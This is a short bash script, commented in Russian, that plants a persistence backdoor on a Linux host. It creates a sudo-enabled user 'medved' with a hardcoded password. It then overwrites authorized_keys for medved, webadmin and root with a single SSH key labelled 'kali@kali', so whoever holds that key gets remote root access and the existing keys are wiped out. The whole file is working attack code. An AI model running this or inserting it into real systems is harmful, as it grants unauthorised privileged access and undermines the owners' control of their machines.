#!/bin/bash
if getent passwd "medved" > /dev/null 2>&1; then
    echo "ok"
else
    #создать пользователя sudo
    useradd -m -s /bin/bash -G sudo -p $(openssl passwd -1 'Bolshoymedved') medved
fi


key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRtp33ZCGcLw/M0Y1WgHwcQDqRe21Ngp3YCxs1C3rgSRxyUfUD1BOS1P4pv3f3gFsr2exViEoJGcivuI/1YaWsR9C2h3Ue3dpn05Se6XnjBN8uMZ5Zkvz9g3kE+A929phFCi9ae5cPMKtrOgvas4XeV7Q34+qSUj0RPgdrDajsM7fFanIiQlWckxb2siam0gFeMW08lCuEjejFZQLsxO4My7MblZ5+1L3/1yUQ5TP8ZlIWieNSZq43FQv3OPSGr9CEWsuZeQjfB664dmg8LhLAnYwQWpf4y1miW+alXPk0QJ/Ekfh4d1zzYUTQmZ1kQ74W0WaSulSXWY3YyuIQrW//w2L89JkMzN9ql2upyrV46yZhqSzEnxb4OXa+mhj+YGrrtiPTRxd/9/246oZKm87mqommdGCHd6cvmgZFXtk4agXbBXwQrj75D4mRzrzMZ96RmqsTrOinatD1N/tBFoIctY3/cNfL0vWIieLrnXvQTdThtxbJVWa7PnxKLYaKxas= kali@kali'
mkdir -p /home/medved/.ssh
echo $key > /home/medved/.ssh/authorized_keys
mkdir -p /home/webadmin/.ssh
echo $key > /home/webadmin/.ssh/authorized_keys
mkdir -p /root/.ssh
echo $key > /root/.ssh/authorized_keys
